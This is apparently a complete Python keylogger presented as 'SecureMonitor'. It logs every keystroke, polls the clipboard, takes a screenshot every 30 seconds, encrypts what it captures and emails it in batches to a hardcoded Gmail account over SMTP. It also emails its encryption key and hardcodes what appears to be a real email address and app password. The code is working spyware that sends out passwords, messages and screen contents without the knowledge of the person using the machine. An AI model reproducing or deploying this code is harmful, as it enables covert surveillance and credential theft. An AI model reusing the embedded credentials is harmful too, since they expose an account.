# secure_monitor.py
# Requirements: pip install pynput pyscreenshot cryptography pyperclip
# NOTE: Use an app-specific email password (not your normal account password).

import os
import time
import threading
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile

import pyscreenshot as ImageGrab
from pynput import keyboard
import pyperclip
from cryptography.fernet import Fernet

# ---------- Configuration ----------
INTERVAL = 60                     # seconds between automatic reports
SCREENSHOT_INTERVAL = 30          # seconds between screenshots (if enabled)
CLIPBOARD_POLL_INTERVAL = 1.0     # seconds for checking clipboard changes
EMAIL = "mazarellosherwin4@gmail.com"
EMAIL_PASSWORD = "uiqj qwqs zhck fpct"  # use app-specific password
SAVE_DIR = os.path.join(os.getcwd(), "monitor_data")
KEYFILE = os.path.join(SAVE_DIR, "secret.key")
# -----------------------------------

os.makedirs(SAVE_DIR, exist_ok=True)


def generate_key(path=KEYFILE):
    """Generate a Fernet key and save it to disk (only once)."""
    if not os.path.exists(path):
        key = Fernet.generate_key()
        with open(path, "wb") as f:
            f.write(key)

        # ---- Send the key to your email once ----
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL
            msg["To"] = EMAIL
            msg["Subject"] = "SecureMonitor - Secret Key"
            msg.attach(MIMEText("Attached is your secret.key for decryption. Keep it safe!", "plain"))

            part = MIMEBase("application", "octet-stream")
            part.set_payload(key)
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename=secret.key")
            msg.attach(part)

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL, EMAIL_PASSWORD)
            server.sendmail(EMAIL, [EMAIL], msg.as_string())
            server.quit()

            print("[+] Secret key generated and emailed to you.")
        except Exception as e:
            print(f"[!] Could not send secret key by email: {e}")
        # ----------------------------------------

        return key
    else:
        with open(path, "rb") as f:
            return f.read()


FERNET_KEY = generate_key()
fernet = Fernet(FERNET_KEY)


class SecureMonitor:
    def __init__(self, interval=INTERVAL, email=EMAIL, password=EMAIL_PASSWORD):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.clipboard_last = ""
        self.running = True

        # Threads
        self._screenshot_thread = None
        self._clipboard_thread = None
        self._report_timer = None

    # ---------------- Keystrokes ----------------
    def save_key(self, key):
        """Callback for keyboard listener."""
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            else:
                char = f" [{str(key)}] "
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp} - {char}"
        self.log += entry

    # ---------------- Clipboard ----------------
    def _clipboard_worker(self):
        """Poll clipboard periodically and log changes."""
        while self.running:
            try:
                clip = pyperclip.paste()
            except Exception:
                clip = ""
            if clip and clip != self.clipboard_last:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"{timestamp} - CLIPBOARD: {clip}\n"
                self.log += entry
                self.clipboard_last = clip
            time.sleep(CLIPBOARD_POLL_INTERVAL)

    def start_clipboard_monitor(self):
        self._clipboard_thread = threading.Thread(target=self._clipboard_worker, daemon=True)
        self._clipboard_thread.start()

    # ---------------- Screenshots ----------------
    def _screenshot_worker(self):
        """Capture screenshots periodically and save encrypted files."""
        while self.running:
            try:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                img_path = os.path.join(SAVE_DIR, f"screenshot_{ts}.png")
                ImageGrab.grab().save(img_path)
                # encrypt the image file
                enc_path = img_path + ".enc"
                self.encrypt_file(img_path, enc_path)
                # remove plaintext screenshot
                try:
                    os.remove(img_path)
                except OSError:
                    pass
            except Exception as e:
                print(f"[!] Screenshot error: {e}")
            time.sleep(SCREENSHOT_INTERVAL)

    def start_screenshots(self):
        self._screenshot_thread = threading.Thread(target=self._screenshot_worker, daemon=True)
        self._screenshot_thread.start()

    # ---------------- Encryption / Storage ----------------
    def encrypt_bytes(self, data: bytes) -> bytes:
        return fernet.encrypt(data)

    def encrypt_file(self, infile, outfile):
        with open(infile, "rb") as f:
            data = f.read()
        enc = self.encrypt_bytes(data)
        with open(outfile, "wb") as f:
            f.write(enc)

    def encrypt_and_save_log(self, plaintext: str) -> str:
        """Save current plaintext log to an encrypted file and return its path."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        tmp = os.path.join(SAVE_DIR, f"keys_{timestamp}.log")
        enc = tmp + ".enc"
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(plaintext)
        self.encrypt_file(tmp, enc)
        try:
            os.remove(tmp)
        except OSError:
            pass
        return enc

    # ----------------- Emailing with batching -----------------
    def send_mail_with_attachments(self, subject, body, attachments=None, batch_size=5):
        attachments = attachments or []
        if not attachments:
            return

        for i in range(0, len(attachments), batch_size):
            batch = attachments[i:i+batch_size]
            try:
                zip_path = os.path.join(SAVE_DIR, f"report_batch_{i//batch_size + 1}.zip")
                with zipfile.ZipFile(zip_path, "w") as zf:
                    for file in batch:
                        zf.write(file, os.path.basename(file))

                msg = MIMEMultipart()
                msg["From"] = self.email
                msg["To"] = self.email
                msg["Subject"] = f"{subject} (Batch {i//batch_size + 1})"
                msg.attach(MIMEText(body, "plain"))

                with open(zip_path, "rb") as f:
                    part = MIMEBase("application", "zip")
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f'attachment; filename="{os.path.basename(zip_path)}"')
                msg.attach(part)

                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, [self.email], msg.as_string())
                server.quit()

                print(f"[+] Email sent with batch {i//batch_size + 1} ({len(batch)} attachments).")
                os.remove(zip_path)
            except Exception as e:
                print(f"[!] Error sending email batch {i//batch_size + 1}: {e}")

    # ---------------- Report Routine ----------------
    def report(self):
        if not self.log:
            self._report_timer = threading.Timer(self.interval, self.report)
            self._report_timer.start()
            return

        try:
            enc_log_path = self.encrypt_and_save_log(self.log)
            attachments = [enc_log_path]
            for fn in os.listdir(SAVE_DIR):
                if fn.endswith(".png.enc") or fn.endswith(".enc"):
                    full = os.path.join(SAVE_DIR, fn)
                    if full != enc_log_path and os.path.getmtime(full) >= time.time() - 24 * 3600:
                        attachments.append(full)

            subject = f"SecureMonitor Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = "Encrypted monitor report attached."

            self.send_mail_with_attachments(subject, body, attachments, batch_size=5)
        finally:
            self.log = ""
            self._report_timer = threading.Timer(self.interval, self.report)
            self._report_timer.start()

    # ---------------- Running / Stopping ----------------
    def run(self, enable_screenshots=True, enable_clipboard=True):
        print("[*] Starting SecureMonitor...")

        listener = keyboard.Listener(on_press=self.save_key)
        listener.start()

        if enable_clipboard:
            self.start_clipboard_monitor()
            print("[*] Clipboard monitoring enabled.")

        if enable_screenshots:
            self.start_screenshots()
            print("[*] Screenshot capture enabled.")

        self.report()

        try:
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("[*] Stopping (KeyboardInterrupt)...")
            self.stop()
        except Exception as e:
            print(f"[!] Runtime error: {e}")
            self.stop()

    def stop(self):
        self.running = False
        if self._report_timer:
            self._report_timer.cancel()
        print("[*] SecureMonitor stopped.")


if __name__ == "__main__":
    monitor = SecureMonitor()
    monitor.run(enable_screenshots=True, enable_clipboard=True)
